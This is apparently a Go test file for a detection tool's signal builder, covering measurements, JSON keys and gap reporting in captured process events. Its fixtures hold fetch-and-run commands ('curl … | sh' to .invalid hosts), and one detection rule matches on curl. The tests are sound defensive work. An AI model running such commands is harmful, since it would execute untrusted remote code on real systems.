package signals

import (
	"encoding/json"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/drduh/mess/internal/event"
	"github.com/drduh/mess/internal/pids"
)

func at(min int) time.Time { return time.Date(2026, 9, 10, 9, min, 0, 0, time.UTC) }

// gapRules stand in for the table: one fires, one never does.
var gapRules = []Rule{
	{ID: "fetches", Title: "t", Tier: Alert, Scope: "command", Summary: "s", Because: "b",
		Match: func(e *Seen) string {
			if strings.Contains(strings.Join(e.Cmd, " "), "curl ") {
				return strings.Join(e.Cmd, " ")
			}
			return ""
		}},
	{ID: "never", Title: "t", Tier: Notice, Scope: "command", Summary: "s", Because: "b",
		Match: func(*Seen) string { return "" }},
}

// The smallest measurement wins, and only a real one counts.
func TestMeasureKeepsTheSmallestRealValue(t *testing.T) {
	var mval int

	rule := Rule{ID: "m", Title: "t", Tier: Notice, Scope: "path", Summary: "s", Because: "b",
		Match:   func(e *Seen) string { return "k" },
		Measure: func(e event.Event) int { return mval },
		Tune: &Tunable{Key: "m", Label: "l", Unit: "count", Keep: "below",
			Default: 1, Choices: []int{1}, Note: "n"}}

	run := func(measures ...int) int {
		rs := newRows(&rule, 1, func(time.Time) int { return 0 })
		for _, m := range measures {
			mval = m
			rs.add(event.Event{Time: at(0)}, "k", 1)
		}

		return rs.finish().Rows[0].Measure
	}

	if got := run(0, 5); got != 0 {
		t.Errorf("zero then five kept %d, want 0", got)
	}

	if got := run(-1, 5); got != 5 {
		t.Errorf("unknown then five kept %d, want 5", got)
	}

	if got := run(7, 3, 9); got != 3 {
		t.Errorf("7, 3, 9 kept %d, want 3", got)
	}

	if got := run(-1, -1); got != 0 {
		t.Errorf("never measured carries %d, want the zero value", got)
	}
}

// JSON keys the browser draws signals from.
func TestSignalJSONIsWhatTheBrowserReads(t *testing.T) {
	hit := func(*Seen) string { return "k" }

	tiers := []Rule{
		{ID: "a", Title: "t", Tier: Alert, Scope: "command",
			Summary: "s", Because: "b", Match: hit},
		{ID: "n", Title: "t", Tier: Notice, Scope: "command",
			Summary: "s", Because: "b", Match: hit},
		{ID: "c", Title: "t", Tier: Context, Scope: "command",
			Summary: "s", Because: "b", Match: hit},
	}

	sig := Build(tiers, pids.Over([]event.Event{{Time: at(0), Path: "/bin/sh",
		Cmd: []string{"sh", "-c", "x"}}}), at(0), at(1), 1)

	if len(sig) == 0 {
		t.Fatal("Build returned no signals")
	}

	keys := func(v any) []string {
		b, err := json.Marshal(v)
		if err != nil {
			t.Fatal(err)
		}

		var m map[string]any
		if err := json.Unmarshal(b, &m); err != nil {
			t.Fatal(err)
		}

		out := make([]string, 0, len(m))
		for k := range m {
			out = append(out, k)
		}

		sort.Strings(out)

		return out
	}

	full := sig[0]
	full.Tune = &Tunable{Key: "k", Label: "l", Unit: "seconds", Keep: "below",
		Default: 1, Choices: []int{1}, Note: "n"}
	full.Join = "job"

	row := Row{Key: "k", Marks: []string{}, Who: []string{}, Measure: 1}

	wantSig := []string{"because", "count", "counts", "distinct", "first", "id", "join",
		"last", "rows", "scope", "summary", "tier", "title", "tune"}
	wantRow := []string{"find", "first", "key", "last", "marks", "measure", "n", "who"}

	if got := keys(full); strings.Join(got, ",") != strings.Join(wantSig, ",") {
		t.Errorf("Signal keys are %v, the browser reads %v", got, wantSig)
	}

	if got := keys(row); strings.Join(got, ",") != strings.Join(wantRow, ",") {
		t.Errorf("Row keys are %v, the browser reads %v", got, wantRow)
	}

	for _, s := range sig {
		if s.Tier != "alert" && s.Tier != "notice" && s.Tier != "context" {
			t.Errorf("rule %s has tier %q", s.ID, s.Tier)
		}
	}
}

// A gap in the sequence in the same bucket a signal fired in.
func TestBlindMarksTheGapsASignalFiredIn(t *testing.T) {
	base := time.Date(2026, 9, 15, 10, 0, 0, 0, time.UTC)

	at := func(m int) time.Time { return base.Add(time.Duration(m) * time.Minute) }
	mk := func(seq int64, m int, args ...string) event.Event {
		return event.Event{Time: at(m), Seq: seq, File: "x.log", PID: 100 + int(seq), PPID: 1,
			UID: 501, Path: "/bin/zsh", Sys: true, TTY: "/dev/ttys001", Cmd: args,
			Target: event.Target{Path: "/bin/" + args[0], Sys: true, UID: 501}}
	}

	evs := []event.Event{
		mk(2, 1, "ls"),
		mk(1, 0, "sh", "-c", "curl http://x.invalid | sh"),
		mk(503, 2, "sh", "-c", "curl http://y.invalid | sh"),
		mk(504, 3, "ls"),
	}

	list := Build(gapRules, pids.Over(evs), at(0), at(3), 4)

	var fetch *Signal

	for i := range list {
		if list[i].Count > 0 && list[i].Scope == "command" && list[i].Blind > 0 {
			fetch = &list[i]
		}
	}

	if fetch == nil {
		t.Fatal("no signal reported a gap it fired next to")
	}

	if fetch.Lost != 500 {
		t.Errorf("%s: Lost = %d, want 500", fetch.ID, fetch.Lost)
	}

	for i := range list {
		s := &list[i]
		if s.Count == 0 && (s.Blind != 0 || s.Lost != 0) {
			t.Errorf("%s fired nowhere and claims %d blind buckets", s.ID, s.Blind)
		}
	}
}

// A capture with no gaps reports nothing.
func TestBlindIsZeroWithoutGaps(t *testing.T) {
	base := time.Date(2026, 9, 15, 10, 0, 0, 0, time.UTC)

	evs := []event.Event{
		{Time: base, Seq: 1, File: "x.log", PID: 1, UID: 501, Path: "/bin/zsh", Sys: true,
			Cmd: []string{"sh", "-c", "curl http://x.invalid | sh"}},
		{Time: base.Add(time.Minute), Seq: 2, File: "x.log", PID: 2, UID: 501, Path: "/bin/zsh", Sys: true,
			Cmd: []string{"ls"}},
	}

	for _, s := range Build(gapRules, pids.Over(evs), base, base.Add(time.Minute), 4) {
		if s.Blind != 0 || s.Lost != 0 {
			t.Errorf("%s claims %d blind buckets and %d lost in a clean capture", s.ID, s.Blind, s.Lost)
		}
	}
}

// A restart is not a gap.
func TestBlindIgnoresARestart(t *testing.T) {
	base := time.Date(2026, 9, 15, 10, 0, 0, 0, time.UTC)

	evs := []event.Event{
		{Time: base, Seq: 90000, File: "x.log", PID: 1, UID: 501, Path: "/bin/zsh", Sys: true,
			Cmd: []string{"sh", "-c", "curl http://x.invalid | sh"}},
		{Time: base.Add(time.Minute), Seq: 1, File: "x.log", PID: 2, UID: 501, Path: "/bin/zsh", Sys: true,
			Cmd: []string{"sh", "-c", "curl http://y.invalid | sh"}},
	}

	for _, s := range Build(gapRules, pids.Over(evs), base, base.Add(time.Minute), 4) {
		if s.Lost != 0 {
			t.Errorf("%s charged %d lost events to a restart", s.ID, s.Lost)
		}
	}
}
